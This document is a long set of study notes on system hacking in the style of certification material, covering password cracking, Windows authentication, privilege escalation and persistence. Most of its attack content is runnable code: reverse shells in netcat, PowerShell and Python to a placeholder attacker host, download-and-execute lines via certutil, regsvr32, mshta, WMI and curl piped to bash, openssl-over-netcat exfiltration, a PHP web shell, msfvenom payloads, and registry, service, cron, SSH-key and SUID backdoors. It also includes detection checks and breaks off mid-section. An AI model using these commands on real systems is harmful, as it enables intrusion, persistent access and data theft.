# System Hacking â€” Detailed Notes ðŸ”§

**Objective:** System hacking is the methodology used to compromise individual machines on a network. It focuses on methodical exploitation (not just "breaking in"); the goal is to obtain and maintain control while avoiding detection. It is the procedure of obtaining unauthorized access to a system and its resources, exploiting weaknesses in computer systems.

**Common Techniques:** Attackers generally use password cracking, viruses, malware, Trojans, worms, phishing techniques, email spamming, social engineering, and exploit operating system vulnerabilities to gain access to victim systems.

---

## 5 Core Goals of System Hacking âœ…
- **Gaining Access:** Breaching authentication or trust boundaries to obtain an initial foothold into the target system.
- **Escalating Privileges:** Moving from a low-privilege user to an administrative or root account (vertical/horizontal escalation).
- **Executing Applications:** Running code on the victim (backdoors, reverse shells, persistence agents, malicious payloads).
- **Hiding Files / Presence:** Using rootkits, ADS, steganography and other techniques to avoid discovery and maintain persistence.
- **Clearing Tracks:** Erasing or tampering with logs and artifacts to impede forensic investigations and avoid detection.

---

## System Hacking Methodology Overview ðŸŽ¯

### The Attack Kill Chain

System hacking follows a structured, methodical approach. Understanding this workflow helps both attackers execute systematic compromises and defenders anticipate and detect each phase.

**Phase Flow:**
```
1. Reconnaissance â†’ 2. Gaining Access â†’ 3. Privilege Escalation â†’ 
4. Maintaining Access â†’ 5. Covering Tracks
```

### Phase Breakdown

**Phase 0: Pre-Attack (Reconnaissance)**
- Target identification and information gathering
- Network mapping and service enumeration
- Vulnerability identification
- Social engineering reconnaissance

**Phase 1: Initial Access**
- Exploiting vulnerabilities
- Credential compromise (password attacks)
- Social engineering execution
- Physical access methods

**Phase 2: Privilege Escalation**
- Local exploits (kernel vulnerabilities)
- Misconfiguration abuse
- Credential harvesting and lateral movement
- Token manipulation and impersonation

**Phase 3: Execution & Persistence**
- Deploy malicious payloads
- Establish persistence mechanisms
- Install backdoors and remote access tools
- Create alternate access methods

**Phase 4: Defense Evasion**
- Rootkit installation
- Process hiding and injection
- ADS and steganography
- Anti-forensics techniques

**Phase 5: Covering Tracks**
- Log manipulation and deletion
- Timestamp modification
- Artifact removal
- Evidence destruction

### Attack Surface Elements

**Network-Based:**
- Exposed services and ports
- Unpatched vulnerabilities
- Weak network segmentation
- Insecure protocols

**Host-Based:**
- Weak passwords and credentials
- Misconfigured services
- Excessive user privileges
- Unpatched operating systems

**Human-Based:**
- Social engineering susceptibility
- Lack of security awareness
- Poor password practices
- Trust relationships

### Defender's Perspective

**Detection Points:**
- Monitor authentication attempts
- Track privilege changes
- Detect new processes/services
- Alert on log anomalies

**Prevention Layers:**
- Strong authentication (MFA)
- Least privilege enforcement
- Regular patching and updates
- Network segmentation
- Endpoint detection and response (EDR)

---

## Phase 1 â€” Gaining Access (Password Cracking & Initial Compromise) ðŸ”

### Password strength & entropy
- **Key idea:** Length increases search space far more than adding a single symbol set. Approximate entropy: `Entropy â‰ˆ L * log2(C)` where `C` is charset size and `L` is length.
  - Example: C=62 (a-zA-Z0-9), L=8 â†’ entropy â‰ˆ `8 * 5.95 â‰ˆ 47.6` bits. Making passwords longer increases entropy linearly by length.
- **Practical tip:** Prefer long passphrases (e.g., `thisismypasswrd`) over short complex strings.

### Attack classes & examples

#### Non-Electronic Attacks
Attacker does not need to possess technical knowledge to crack passwords, hence known as non-technical attacks.
- **Shoulder Surfing:** Looking at either the user's keyboard or screen while they are logging in to observe credentials.
- **Social Engineering:** Convincing people to reveal passwords through manipulation and deception.
- **Dumpster Diving:** Searching for sensitive information in the user's trash bins, printer trash bins, and user desks for sticky notes containing passwords.

#### Active Online Attacks
Attacker performs password cracking by directly communicating with the victim machine.
- **Dictionary Attack:** A dictionary file is loaded into the cracking application that runs against user accounts. The program compares hashed passwords with precomputed dictionary word hashes.
- **Brute Force Attack:** The program tries every combination of characters until the password is broken. Extremely time-consuming but guaranteed to work eventually.
- **Rule-based Attack:** This attack is used when the attacker gets some information about the password. Rules are applied to dictionary words (e.g., replacing 'a' with '@', adding numbers).
- **Password Guessing:** 
  - Find a valid user account
  - Create a list of possible passwords from information gathered through social engineering
  - Rank passwords from high probability to low
  - Key in each password until correct password is discovered
- **Default Passwords:** Default passwords are supplied by manufacturers with new equipment (switches, hubs, routers). Attackers use these in their dictionaries.
- **Hash Injection (Pass-the-Hash):** Allows an attacker to inject a compromised hash into a local session and use the hash to validate to network resources. The attacker finds and extracts a logged-on domain admin account hash, then uses it to log on to the domain controller.
- **Malware/Keyloggers/Trojans/Spyware:** Attacker installs malicious software on victim's machine to collect credentials. These run in the background and send back all user credentials to the attacker.
- **USB Drive Attack (Lab Example):**
  - Download PassView, a password recovery tool
  - Copy the downloaded files to USB drive
  - Create autorun.inf file: `[autorun]` and `open=launch.bat`
  - Create launch.bat: `start pspv.exe /stext pspv.txt`
  - Insert the USB drive; if autorun is enabled, PassView executes in background
  - Passwords will be stored in .TXT files on the USB drive
  - **Note:** Modern OSes often disable autorunâ€”be aware of differences in real-world settings.

#### Passive Online Attacks
Attacker performs password cracking without communicating with the authorizing party.
- **Wire Sniffing (Eavesdropping):** Attackers run packet sniffer tools on LAN to access and record raw network traffic. Captured data may include sensitive information such as passwords (FTP, rlogin sessions), emails, and authentication tokens.
- **Man-in-the-Middle Attack:** Intercepting communication between two parties to capture authentication data.
- **Replay Attack:** Packets and authentication tokens are captured using a sniffer. After relevant info is extracted, the tokens are placed back on the network to gain access.

#### Offline Attacks
Attacker copies the target's password file and tries to crack passwords on their own system at a different location.
- **Rainbow Table Attack:** 
  - A rainbow table is a precomputed table containing word lists (dictionary files, brute force lists) and their hash values
  - Easy to recover passwords by comparing captured password hashes to precomputed tables
  - Example precomputed hashes:
    - `1qazwed -> 21c40e47dba72e77518ee3ef88ad0cc8`
    - `hh021da -> 2ce80b192cfa47a0d6c8a2446314810b`
- **Distributed Network Attack (DNA):** Used for recovering passwords from hashes or password-protected files using unused processing power of machines across the network. DNA Manager coordinates the attack and allocates small portions of the key search to distributed machines. DNA Client runs in background consuming only unused processor time.

### Tools & lab commands (authorized use only)

#### Password Cracking Tools
- **Hashcat (GPU):** `hashcat -m 1000 -a 0 -o cracked.txt hashes.txt wordlist.txt`  (mode 1000 = NTLM)
- **John the Ripper:** `john --wordlist=rockyou.txt --format=NT hashes.txt`
- **Rainbow Table Generators:**
  - **rtgen:** Command syntax: `rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index`
  - Example: `rtgen md5 loweralpha 1 8 0 3800 33554432 0` (tune params for chains/tables)
  - **Winrtgen:** Graphical Rainbow Tables Generator supporting LM, FastLM, NTLM, LMCHALL, HalfLMCHALL, NTLMCHALL, MSCACHE, MD2, MD4, MD5, SHA1, RIPEMD160, MySQL323, MySQLSHA1, CiscoPIX, ORACLE, SHA-2(256), SHA-2(384), and SHA-2(512) hashes
- **Collect Linux hashes (lab):** `sudo unshadow /etc/passwd /etc/shadow > linux_hashes.txt`
- **Distributed cracking:** DNA setups use a manager to allocate cracking tasks to many clients (use only in controlled labs).

### Keyloggers & malware

A keylogger (also called spy software) is a small program that monitors each and every keystroke a user types on a specific computer's keyboard. Once installed (in just a few seconds), it operates in total stealth mode capturing every keystroke. The victim will never know about its presence.

#### Types of Keyloggers

**Hardware/External Keyloggers:**
- **Keyboard Keyloggers:** Hardware keyloggers utilize a hardware circuit attached between the computer keyboard and computer, typically inline with keyboard's cable connector
- **USB Keyloggers:** USB connector-based hardware keyloggers, also available for laptops
- **Wi-Fi Keyloggers:** Features remote access over Internet. Connects to local Wi-Fi Access Point and sends emails containing recorded keystroke data
- **Bluetooth Keyloggers:** Wireless keyloggers using Bluetooth connectivity
- **Acoustic/CAM Keyloggers:** Monitors the sound created by typing on a computer. Each key makes a subtly different acoustic signature when struck
- **PS/2 Keyloggers:** Inline connectors for PS/2 keyboards

**Software Keyloggers:**
- **Application Keyloggers:** Installed as regular application on system, logs all keyboard events from any user
- **Kernel Keyloggers:** A program obtains root access to hide in the OS and intercepts keystrokes passing through the kernel, making it difficult to detect
- **Hypervisor-based Keyloggers:** Keylogger resides in a malware hypervisor running underneath the OS (e.g., Blue Pill). The OS effectively becomes a virtual machine
- **Form Grabbing Based Keyloggers:** Log web form submissions by recording web browsing submit events

#### Working of Remote Keyloggers
- Keylogging software runs hidden in background, making note of each keystroke
- May filter data by looking for special patterns (credit card numbers, passwords, etc.)
- Can connect to remote server or establish sessions periodically to send information via Internet
- Send log files by email using mail server or simple HTTP request to attacker-owned server

#### Anti-Keyloggers
Anti-keylogger software is specifically designed for detection of keystroke logger software. Often incorporates ability to delete or immobilize hidden keystroke logger software. Note: Anti-keyloggers don't distinguish between legitimate and illegitimate keystroke-logging programsâ€”all are flagged.

**Types:**
- **Signature-based:** Has signature database with strategic information to uniquely identify keyloggers. Contains as many known keyloggers as possible. Vulnerable to unknown or unrecognized keyloggers obtained by changing some code.
- **Heuristic analysis:** Doesn't use signature bases; uses checklist of known features, attributes, and methods that keyloggers use. May block non-keyloggers due to false positives.

### Spyware

Spyware is a program that records user's interaction with the computer and Internet without the user's knowledge and sends them to remote attackers. It hides its process, files, and other objects to avoid detection and removal.

**Characteristics:**
- Similar to Trojan horse, usually bundled as hidden component of freeware programs available for download
- Allows attacker to gather information about victim or organization: email addresses, user logins, passwords, credit card numbers, banking credentials

**Spyware Propagation Methods:**
- Drive-by downloads
- Masquerading as anti-spyware
- Web browser vulnerability exploits (IE, Firefox)
- Piggybacked software installation
- Browser add-ons
- Cookies

**Spyware Examples:**
- **USB Spyware:** USBSpy captures, displays, records, and analyzes data transferred between USB devices and PC applications
- **Audio Spyware:** Spy Voice Recorder, Sound Snooper
- **Video Spyware:** WebCam Recorder
- **Cellphone Spyware:** Mobile Spy, mSpy, Spyzie
- **GPS Spyware:** SPYPhone

### Windows Authentication Mechanisms

#### Security Accounts Manager (SAM) Database
- **Location:** Stored at `%SystemRoot%/system32/config/SAM` and mounted on `HKLM/SAM`
- **Purpose:** Database file in Windows XP, Vista, 7, 8.1, and 10 that stores users' passwords
- **Function:** Can be used to authenticate local and remote users
- **Security:** Uses cryptographic measures to prevent unauthenticated users from accessing the system
- **Storage Format:** User passwords are stored in hashed format in registry hive either as LM hash or NTLM hash
- **Note:** Beginning with Windows 2000 SP4, Active Directory authenticates remote users

#### LM (Lan Manager) Hash
- **History:** Encryption mechanism used by Microsoft before NTLM was released
- **Mechanism:** One-way hash allowing users to enter credentials on workstation and encrypt them
- **Weaknesses:**
  - Password padded to 14 bytes
  - Each 7-byte half is encrypted with DES using separate keys, making it weaker
  - Not truly one-way
  - Highly susceptible to brute force attacks
- **Current Status:** LM hashes disabled in Windows Vista and later; LM field will be blank in modern systems

#### NTLM (New Technology LAN Manager) Authentication
- **Versions:** Includes LM version 1 and 2, and NTLM version 1 and 2
- **Protocol Type:** Legacy challenge-response protocol; vulnerable to Pass-the-Hash attacks
- **Mechanism:** Based on challenge-response, proving to server that user knows password associated with an account
- **Verification Process:** Resource server must perform one of these actions:
  - Contact domain authentication service on domain controller (for domain accounts)
  - Look up computer's or user's account in local database (for local accounts)
- **Core Operations:**
  - **Authentication:** Provides challenge-response authentication mechanism
  - **Signing:** NTLMSSP applies digital signature to messages using symmetric signature scheme (MAC)
  - **Sealing:** NTLMSSP uses symmetric key encryption providing confidentiality
- **Current Status:** Microsoft upgraded default authentication protocol to Kerberos, but NTLM still supported for backward compatibility

#### Kerberos Authentication
- **Status:** Default AD protocol providing stronger authentication than NTLM
- **Version:** Kerberos version 5 provides mechanism for mutual authentication between client and server or two servers
- **Infrastructure:** Key Distribution Center (KDC) uses domain's Active Directory service database as security account database
- **Environment:** Communication takes place on active Internet where attackers can impersonate clients/servers, eavesdrop, or tamper with communications

**Main Entities in Kerberos Flow:**
- **Client:** Initiates communication for service request, acts on behalf of the user
- **Server:** The server with the service the user wants to access
- **Authentication Server (AS):** Performs client authentication, issues Ticket Granting Ticket (TGT) that proves to other servers client has been authenticated
- **Key Distribution Center (KDC):** Authentication server is logically separated into three parts:
  - Database (db)
  - Authentication Server (AS)
  - Ticket Granting Server (TGS)
  - All exist in single server called KDC
- **Ticket Granting Server (TGS):** Application server which provides issuing of service tickets as a service

**Kerberoasting Attack:**
- Any authenticated user can request a service ticket (TGS) for a Service Principal Name (SPN)
- Export the encrypted ticket
- Crack it offline to recover the service account password
- **Tools:** `Impacket` (GetUserSPNs), `PowerSploit`, `Empire`
- **Cracking:** Use `hashcat` (mode `-m 13100` for Kerberoast) or `john`

#### Domain Controller (DC)
- **Definition:** Server that responds to security authentication requests within Windows Server domain
- **Function:** Server on Microsoft Windows/Windows NT network responsible for allowing host access to Windows domain resources
- **Role:** Centerpiece of Windows Active Directory service; authenticates users, stores user account information, and enforces security policy for Windows domain
- **Evolution:** Beginning with Windows 2000, primary and backup domain controller roles were replaced by Active Directory

#### Active Directory (AD)
- **Definition:** Microsoft product consisting of several services running on Windows Server to manage permissions and access to networked resources
- **Storage:** Stores data as objects (single elements like user, group, application, or device such as printer)
- **AD DS:** Verifies access when user signs into device or attempts to connect to server over network
- **Forest:** Formed by set of multiple trusted domain trees, forms uppermost layer of Active Directory

### LLMNR / NBT-NS Poisoning
- **Attack Method:** Spoof responses to local name-resolution broadcasts and capture NTLM hashes returned by victims when they attempt to authenticate
- **Protocol Abuse:** Exploits Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) protocols
- **Attack Tools:** `Responder`, `Inveigh`, Metasploit modules
- **Mitigation Strategies:**
  - Disable LLMNR and NBT-NS via Group Policy
  - Monitor for unusual responders on the network
  - Enforce DNS/name hygiene and proper DNS configuration
  - Use network segmentation to limit broadcast domains

---

## Phase 2 â€” Privilege Escalation â¬†ï¸

### Concepts
- **Vertical:** Move from user to admin/root.
- **Horizontal:** Compromise other accounts at same privilege level.

### Typical techniques
- **DLL hijacking (Windows):** Many apps search CWD before system paths when loading DLLs. Placing a malicious DLL with the expected name into the app directory causes it to load attacker code.
- **Service misconfigurations:** Weak service file permissions or misconfigured services (writeable binaries, insecure startup) allow service replacement or abuse.
- **Credential reuse & cached creds:** Captured creds reused across systems.
- **SUID binaries (Linux):** Misconfigured SUIDs allow local privilege elevation.
- **Vulnerable drivers/kernels:** Local exploit code can escalate to kernel privileges.

### Detection & checks (defensive)
- **Windows:** enumerate services and scheduled tasks, check service binary ACLs, inspect autostart entries.
- **Linux:** find SUID binaries: `find / -perm -4000 -type f 2>/dev/null` and cross-check with GTFOBins for risky behaviors.
- **Useful commands (audit):** `whoami /priv`, `sc query`, `Get-Service`, `Get-Acl` (PowerShell) for Windows; `sudo -l`, `id`, `getcap -r /` for Linux.

---

## Phase 3 â€” Execution (Payloads & Postâ€‘Compromise Tools) ðŸ’»

### Metasploit overview
- **Modules:** `exploit`, `payload`, `auxiliary`, `nop`.
- **Payload types:** `singles` (standalone), `stagers`/`stages` (bootstrap network connection), `stageless` (single large payload).
- **Typical workflow:**
  - `use <exploit>`
  - `set RHOST <target>`
  - `set LHOST <attacker>`
  - `set PAYLOAD <payload>`
  - `exploit`
- **Example (lab):** `use exploit/windows/smb/ms17_010_eternalblue` + `set PAYLOAD windows/x64/meterpreter/reverse_tcp` + `exploit`.

### Malicious payloads & capabilities
- **Backdoors/Reverse shells:** Persistent remote access to the host.
- **Keyloggers/Spyware:** Keystrokes, screenshots, browser data extraction.
- **Data exfiltration:** Compression and covert channels (DNS, HTTPS, steganography).

### Persistence Mechanisms

Persistence ensures attacker maintains access even after system reboots, credential changes, or initial access point closure. Modern attackers employ multiple persistence methods simultaneously.

#### Windows Persistence Techniques

**1. Registry Run Keys**

Most common persistence method - programs execute at user login or system startup.

```cmd
# Current User Auto-start
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

# System-wide Auto-start
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Add persistence via registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# PowerShell method
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\malware.exe"
```

**Additional Run Key Locations:**
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**2. Scheduled Tasks**

Execute payloads at specific times or system events.

```cmd
# Create scheduled task (Windows)
schtasks /create /tn "SystemUpdate" /tr "C:\malware.exe" /sc onlogon /ru System

# Create task that runs every hour
schtasks /create /tn "Updater" /tr "powershell.exe -WindowStyle Hidden -File C:\script.ps1" /sc hourly

# Create task with specific user context
schtasks /create /tn "Backup" /tr "C:\backdoor.exe" /sc daily /st 14:00 /ru "DOMAIN\user" /rp "password"

# List all scheduled tasks
schtasks /query /fo LIST /v

# PowerShell scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger
```

**3. Windows Services**

Services run with SYSTEM privileges and start automatically.

```cmd
# Create malicious service
sc create "SecurityService" binPath= "C:\malware.exe" start= auto
sc description "SecurityService" "Windows Security Update Service"
sc start "SecurityService"

# PowerShell service creation
New-Service -Name "UpdateService" -BinaryPathName "C:\backdoor.exe" -DisplayName "Windows Update Helper" -StartupType Automatic

# Modify existing service
sc config "SomeService" binPath= "C:\malware.exe"
```

**4. Startup Folder**

Programs placed here execute at user login.

```cmd
# Current user startup folder
C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# All users startup folder
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

# Copy malware to startup
copy C:\malware.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

**5. WMI Event Subscriptions**

Stealthy persistence using Windows Management Instrumentation.

```powershell
# Create WMI event filter (trigger)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create WMI consumer (action)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "powershell.exe -NoP -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# List WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

**6. DLL Hijacking**

Replace or add malicious DLLs that legitimate applications load.

```cmd
# Common DLL hijacking locations
- Application directory (highest priority)
- C:\Windows\System32
- C:\Windows\System
- Current directory

# AppInit_DLLs registry key (loads DLL into every process)
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

**7. COM Hijacking**

Modify Component Object Model (COM) objects to load malicious code.

```cmd
# Hijack COM object
HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
```

**8. Image File Execution Options (IFEO)**

Debugger key causes Windows to run specified program before target executable.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "C:\malware.exe" /f
```

**9. Accessibility Features Backdoor**

Replace accessibility binaries (sticky keys, narrator, magnifier).

```cmd
# Replace sticky keys with cmd.exe
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Now pressing Shift 5 times opens cmd.exe at login screen
```

**10. Logon Scripts**

Scripts executed when user logs in.

```cmd
# User logon script registry
HKCU\Environment\UserInitMprLogonScript

# Group Policy logon scripts
C:\Windows\SYSVOL\domain\scripts
```

#### Linux Persistence Techniques

**1. Cron Jobs**

```bash
# Edit user crontab
crontab -e

# Add malicious cron job (runs every hour)
0 * * * * /tmp/.hidden/backdoor.sh

# System-wide cron
echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab

# Cron directories
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/crontabs/
```

**2. Systemd Services**

```bash
# Create malicious systemd service
cat > /etc/systemd/system/update.service <<EOF
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/usr/local/bin/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl enable update.service
systemctl start update.service
```

**3. RC Scripts / Init.d**

```bash
# Add to rc.local
echo "/tmp/.hidden/backdoor.sh &" >> /etc/rc.local
chmod +x /etc/rc.local

# Create init.d script
cp backdoor.sh /etc/init.d/network-monitor
update-rc.d network-monitor defaults
```

**4. Bash Profile / RC Files**

```bash
# User-level persistence
echo '/tmp/.backdoor &' >> ~/.bashrc
echo '/tmp/.backdoor &' >> ~/.bash_profile
echo 'export PROMPT_COMMAND="/tmp/.backdoor"' >> ~/.bashrc

# System-wide
echo '/tmp/.backdoor &' >> /etc/profile
echo '/tmp/.backdoor &' >> /etc/bash.bashrc
```

**5. SSH Keys**

```bash
# Add attacker's SSH public key
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root SSH key
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys
```

**6. SUID Backdoors**

```bash
# Create SUID shell
cp /bin/bash /tmp/.hidden/rootshell
chmod 4755 /tmp/.hidden/rootshell

# Execution
/tmp/.hidden/rootshell -p
```

**7. LD_PRELOAD**

```bash
# Library preloading
echo "/tmp/malicious.so" >> /etc/ld.so.preload
```

**8. PAM Backdoors**

```bash
# Modify PAM configuration to allow backdoor password
/etc/pam.d/common-auth
/etc/pam.d/sshd
```

#### Detection and Removal

**Windows Detection:**
```powershell
# Check run keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# List scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# List services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Check WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer

# Autoruns from Sysinternals
autorunsc.exe -a * -c -h -s -v
```

**Linux Detection:**
```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Check systemd services
systemctl list-unit-files --type=service --state=enabled

# Check startup scripts
cat /etc/rc.local
cat ~/.bashrc ~/.bash_profile /etc/profile

# Check SSH keys
cat ~/.ssh/authorized_keys

# Find SUID files
find / -perm -4000 -type f 2>/dev/null
```

### Backdoors and Remote Access Tools (RATs)

#### Types of Backdoors

**1. Reverse Shell Backdoors**
- Connect back to attacker's machine
- Bypass firewall restrictions
- Examples: Netcat, Metasploit payloads

```bash
# Netcat reverse shell (Linux)
nc -e /bin/bash attacker_ip 4444

# PowerShell reverse shell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**2. Bind Shell Backdoors**
- Open listener on target machine
- Attacker connects to target
- Easier to detect (open ports)

**3. Web Shell Backdoors**
- Uploaded to web servers
- Accessed via HTTP/HTTPS
- Blends with normal web traffic

```php
// Simple PHP web shell
<?php system($_GET['cmd']); ?>

// Usage: http://target.com/shell.php?cmd=whoami
```

**4. Command and Control (C2) Frameworks**

**Metasploit Meterpreter:**
- Full-featured RAT with extensive post-exploitation modules
- In-memory execution (fileless)
- Advanced privilege escalation and persistence

```bash
# Generate standalone payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe -o update.exe

# Start listener
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST attacker_ip
set LPORT 443
exploit
```

**Cobalt Strike:**
- Professional adversary simulation framework
- Beacon payloads with malleable C2 profiles
- Team collaboration features

**Empire/Starkiller:**
- PowerShell-based post-exploitation framework
- Pure PowerShell agents
- Extensive module library

**Covenant:**
- .NET-based C2 framework
- Web-based interface
- Modern C# payloads

**Sliver:**
- Open-source C2 framework
- Cross-platform (Windows, Linux, macOS)
- Multiple communication protocols

#### Commercial RATs

- **DarkComet:** Remote administration tool with extensive surveillance features
- **NjRAT:** Popular RAT with keylogging, webcam access, remote desktop
- **QuasarRAT:** Open-source remote administration tool
- **AsyncRAT:** .NET-based RAT with persistence mechanisms

### Living Off The Land Techniques (LOLBins)

Using legitimate system tools to avoid detection and bypass security controls.

#### Windows LOLBins

**1. PowerShell**

```powershell
# Download and execute
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Base64 encoded command (bypass logging)
powershell -EncodedCommand <base64_encoded_command>

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# Download file
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker.com/file.exe','C:\file.exe')"
```

**2. Certutil (Download Files)**

```cmd
# Download file using certutil
certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe

# Decode base64 file
certutil -decode encoded.txt decoded.exe
```

**3. BITSAdmin (Background Transfer)**

```cmd
# Download file in background
bitsadmin /transfer job /download /priority high http://attacker.com/file.exe C:\file.exe
```

**4. Regsvr32 (Execute Scripts)**

```cmd
# Execute remote scriptlet
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll
```

**5. Mshta (HTML Applications)**

```cmd
# Execute remote HTA
mshta http://attacker.com/payload.hta

# Execute inline JavaScript
mshta "javascript:alert('XSS');close()"
```

**6. Rundll32 (DLL Execution)**

```cmd
# Execute DLL function
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('XSS');

# Load remote DLL
rundll32.exe \\attacker\share\malicious.dll,EntryPoint
```

**7. WMIC (Windows Management)**

```cmd
# Execute remote command
wmic /node:target process call create "cmd.exe /c malware.exe"

# Download and execute
wmic os get /format:"http://attacker.com/evil.xsl"
```

**8. MSBuild (Compile and Execute)**

```cmd
# Execute C# code embedded in XML
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

**9. InstallUtil (.NET Installer)**

```cmd
# Execute malicious .NET assembly
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U malware.exe
```

**10. Forfiles (Command Execution)**

```cmd
# Execute command
forfiles /p C:\Windows\System32 /m notepad.exe /c calc.exe
```

#### Linux LOLBins

**1. Curl / Wget (Download)**

```bash
# Download and execute
curl http://attacker.com/script.sh | bash
wget -O - http://attacker.com/script.sh | bash

# Download file
curl -o /tmp/malware http://attacker.com/malware
```

**2. Python / Perl / Ruby**

```bash
# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Download file with Python
python -c "import urllib; urllib.urlretrieve('http://attacker.com/file', '/tmp/file')"
```

**3. SSH (Tunneling and Port Forwarding)**

```bash
# Local port forwarding
ssh -L 8080:internal_host:80 user@jump_host

# Remote port forwarding
ssh -R 9090:localhost:80 user@attacker_machine

# Dynamic SOCKS proxy
ssh -D 1080 user@jump_host
```

**4. Find (Execute Commands)**

```bash
# Execute command on found files
find / -name "*.txt" -exec cat {} \;

# Privilege escalation if find has SUID
find / -exec /bin/bash -p \; -quit
```

**5. AWK / SED**

```bash
# Execute commands
awk 'BEGIN {system("id")}'
sed -n '1e id' /etc/hosts
```

**6. OpenSSL (Data Exfiltration)**

```bash
# Encrypt and send data
tar czf - /sensitive/data | openssl enc -aes-256-cbc -k password | nc attacker_ip 4444
```

#### Defense Against LOLBins

**Prevention:**
- Application whitelisting (AppLocker, Windows Defender Application Control)
- Restrict PowerShell execution modes
- Disable unnecessary scripting engines
- Remove or restrict dangerous utilities

**Detection:**
- Monitor command-line arguments
- Track parent-child process relationships
- Alert on suspicious tool usage (certutil downloading executables)
- Implement behavior analytics

**Monitoring:**
```powershell
# PowerShell logging
Enable-PSRemoting
Set-ExecutionPolicy RemoteSigned

# Enable script block logging
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWORD

# Enable module logging
